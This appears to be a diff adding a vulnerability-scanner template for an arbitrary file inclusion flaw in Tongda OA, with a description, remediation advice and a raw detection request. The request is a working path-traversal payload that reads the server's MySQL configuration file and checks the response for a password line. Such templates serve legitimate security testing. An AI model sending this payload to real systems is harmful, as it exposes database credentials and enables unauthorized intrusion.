@@ -1,0 +1,41 @@
+id: Tongda-OA-FileInclude
+info:
+  name: Tongda OA Arbitrary File Inclusion
+  author:
+  - l0ne1y
+  tags:
+  - tongda
+  - lfi
+  description: |-
+    Tongda OA Arbitrary File Inclusion
+    To make code more flexible, developers set included files as variables for dynamic invocation, which allows clients to maliciously invoke a malicious file, resulting in a file inclusion vulnerability.
+  reference:
+  - https://github.com/jas502n/oa-tongda-rce
+  severity: critical
+  remediation: |-
+    #### Official remediation:
+    Upgrade the system to a version without the vulnerability, or download the security patch from the official website.
+requests:
+- matchers:
+  - type: word
+    condition: and
+    part: header
+    words:
+    - text/html
+  - type: word
+    condition: and
+    part: body
+    words:
+    - '[mysql]'
+    - password=
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  raw:
+  - |
+    POST /ispirit/interface/gateway.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    json={"url":"/general/../../mysql5/my.ini"}
